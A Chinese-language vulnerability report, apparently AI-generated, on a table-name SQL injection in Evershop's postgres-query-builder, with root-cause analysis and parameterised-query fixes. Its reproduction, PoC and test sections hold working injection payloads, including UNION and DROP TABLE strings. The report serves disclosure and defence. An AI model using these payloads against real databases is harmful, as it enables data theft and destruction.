# Evershop postgres-query-builder UpdateQuery SQL注入漏洞报告

## 1. 漏洞挖掘目标

- **受影响系统/产品**：Evershop E-commerce Platform - postgres-query-builder 模块
- **受影响版本**：2.1.0 及之前版本
- **仓库地址**：https://github.com/evershopcommerce/evershop

## 2. 漏洞说明

### 2.1 漏洞描述

- **漏洞类型**：SQL注入 (CWE-89)
- **漏洞名称**：Evershop postgres-query-builder UpdateQuery.sql() 表名SQL注入漏洞
- **风险等级**：严重
- **概述**：postgres-query-builder 库的 `UpdateQuery` 类在生成SQL语句时，将表名通过字符串模板直接拼接到 `information_schema` 查询中，未使用参数化查询。当库使用者将用户可控输入作为表名传入 `update()` 函数时，攻击者可注入恶意SQL代码，导致数据库信息泄露、数据篡改甚至远程代码执行。

### 2.2 利用前提与特征

- **利用难度**：中（需要应用代码将用户输入作为表名传入）
- **权限要求**：取决于应用实现，可能无需认证
- **操作条件**：
  1. 应用代码使用 `update(userInput)` 形式调用，其中 `userInput` 来自用户可控输入
  2. 数据库连接具有查询 `information_schema` 的权限
- **当前Evershop利用状态**：在当前Evershop代码中，所有 `update()` 调用均使用硬编码表名，暂不可被直接利用。但作为独立npm包发布的库，其他使用该库的项目可能受影响。

### 2.3 漏洞效果

漏洞攻击成功后的效果如下：

1. **信息泄露**：读取 `information_schema` 中所有表的列信息
2. **认证绕过**：通过修改查询逻辑绕过表名限制
3. **数据篡改**：在某些数据库配置下可能执行堆叠查询
4. **权限提升**：获取数据库结构信息后进行进一步攻击

## 3. 漏洞复现

- **是否可以制作成自动化复现脚本**：是

### 3.1 漏洞复现过程

**步骤1：定位漏洞代码**

文件：`packages/postgres-query-builder/src/index.ts`，第834-845行

```typescript
async sql(connection: PoolClient): Promise<string> {
  if (!this._table) {
    throw Error('You need to call specific method first');
  }
  if (Object.keys(this._data).length === 0) {
    throw Error('You need provide data first');
  }

  // 漏洞点：表名通过字符串模板直接拼接
  const { rows } = await connection.query(
    `SELECT
      table_name,
      column_name,
      data_type,
      is_nullable,
      column_default,
      is_identity,
      identity_generation
    FROM information_schema.columns
    WHERE table_name = '${this._table}'`  // <-- SQL注入点
  );
  // ...
}
```

**步骤2：构造恶意输入**

假设存在如下应用代码：
```typescript
// 假设的漏洞应用代码
app.patch('/api/tables/:tableName', async (req, res) => {
  const tableName = req.params.tableName;  // 用户可控
  await update(tableName)
    .given(req.body)
    .where('id', '=', req.body.id)
    .execute(connection);
});
```

**步骤3：发送攻击请求**

```http
PATCH /api/tables/users'%20OR%20'1'='1 HTTP/1.1
Host: target.com
Content-Type: application/json

{"id": 1, "status": "active"}
```

**步骤4：观察执行的SQL**

原始查询被注入后变为：
```sql
SELECT table_name, column_name, data_type, ...
FROM information_schema.columns
WHERE table_name = 'users' OR '1'='1'
```

这将返回数据库中所有表的列信息。

## 4. 漏洞利用

- **是否可以制作成自动化复现脚本**：是

### 4.1 PoC脚本

```typescript
// poc-sql-injection.ts
import { update, getConnection } from '@evershop/postgres-query-builder';
import { Pool } from 'pg';

async function exploitSQLInjection() {
  const pool = new Pool({
    connectionString: 'postgresql://user:pass@localhost:5432/evershop'
  });

  const connection = await getConnection(pool);

  // 恶意表名 - 读取所有表信息
  const maliciousTableName = "users' OR '1'='1";

  try {
    // 这将触发SQL注入
    const result = await update(maliciousTableName)
      .given({ status: 'test' })
      .where('id', '=', 1)
      .execute(connection);

    console.log('Attack result:', result);
  } catch (error) {
    // 即使失败，information_schema查询可能已执行
    console.log('Error (expected):', error.message);
  }

  await pool.end();
}

exploitSQLInjection();
```

### 4.2 高级利用 - 读取敏感表结构

```typescript
// 读取admin_user表结构
const payload = "admin_user'--";
await update(payload).given({dummy: 'value'}).execute(connection);

// 使用UNION注入读取数据（需要更复杂的payload）
const unionPayload = "x' UNION SELECT table_name,column_name,data_type,'Y','default','N','NEVER' FROM information_schema.columns WHERE table_schema='public'--";
```

## 5. 漏洞原理

### 5.1 数据流分析

```
┌────────────────────────────────────────────────────────────────┐
│                     SQL注入数据流                               │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  1. 入口点: update(table) 函数调用                              │
│     export function update(table: string): UpdateQuery {       │
│       return new UpdateQuery(table);  ← 表名传入                │
│     }                                                          │
│                           │                                    │
│                           ▼                                    │
│  2. 构造函数存储表名                                            │
│     class UpdateQuery extends Query {                          │
│       constructor(table: string) {                             │
│         this._table = table;  ← 污点存储                        │
│       }                                                        │
│     }                                                          │
│                           │                                    │
│                           ▼                                    │
│  3. sql()方法生成查询                                           │
│     async sql(connection: PoolClient): Promise<string> {       │
│       const { rows } = await connection.query(                 │
│         `SELECT ... FROM information_schema.columns            │
│          WHERE table_name = '${this._table}'`  ← 注入点!       │
│       );                                                       │
│     }                                                          │
│                           │                                    │
│                           ▼                                    │
│  4. 危险SQL执行                                                 │
│     connection.query() 执行包含恶意代码的SQL                    │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

### 5.2 根因分析

1. **不安全的字符串拼接**：使用ES6模板字符串 `${this._table}` 直接嵌入SQL
2. **缺乏输入验证**：未对表名进行格式验证或转义
3. **设计缺陷对比**：同一文件中的 `InsertOnUpdateQuery.sql()` 使用了正确的参数化查询：

```typescript
// 正确实现 (InsertOnUpdateQuery.sql() 第1022-1034行)
const { rows } = await connection.query({
  text: `SELECT ... FROM information_schema.columns WHERE table_name = $1`,
  values: [this._table]  // 参数化查询，安全
});
```

### 5.3 对比：安全 vs 不安全实现

| 方面 | UpdateQuery (不安全) | InsertOnUpdateQuery (安全) |
|------|---------------------|---------------------------|
| 查询方式 | 字符串模板 | 参数化查询 |
| 代码 | `` `...${this._table}` `` | `{text: ..., values: [this._table]}` |
| 漏洞 | SQL注入 | 无 |

## 6. 修复建议

### 6.1 立即修复方案

修改 `packages/postgres-query-builder/src/index.ts` 第834-845行：

```typescript
// 修复前 (不安全)
const { rows } = await connection.query(
  `SELECT table_name, column_name, data_type, is_nullable,
   column_default, is_identity, identity_generation
   FROM information_schema.columns
   WHERE table_name = '${this._table}'`
);

// 修复后 (安全 - 使用参数化查询)
const { rows } = await connection.query({
  text: `SELECT table_name, column_name, data_type, is_nullable,
         column_default, is_identity, identity_generation
         FROM information_schema.columns
         WHERE table_name = $1`,
  values: [this._table]
});
```

### 6.2 同步修复 InsertQuery.sql()

`InsertQuery.sql()` 方法（第925-936行）存在相同问题，需要同样修复。

### 6.3 防御性编码建议

1. **表名白名单验证**：
```typescript
const ALLOWED_TABLES = ['customer', 'order', 'product', ...];
if (!ALLOWED_TABLES.includes(this._table)) {
  throw new Error(`Invalid table name: ${this._table}`);
}
```

2. **表名格式验证**：
```typescript
if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(this._table)) {
  throw new Error('Invalid table name format');
}
```

3. **使用标识符引用**：
```typescript
import { escapeIdentifier } from 'pg';
const safeTable = escapeIdentifier(this._table);
```

### 6.4 测试用例

```typescript
describe('SQL Injection Prevention', () => {
  it('should reject malicious table names', async () => {
    const maliciousNames = [
      "users' OR '1'='1",
      "users; DROP TABLE customers;--",
      "users' UNION SELECT * FROM admin_users--"
    ];

    for (const name of maliciousNames) {
      await expect(
        update(name).given({test: 'value'}).execute(connection)
      ).rejects.toThrow();
    }
  });
});
```

---

**报告编写日期**：2026-01-04
**分析师**：Claude Code Security Analyzer
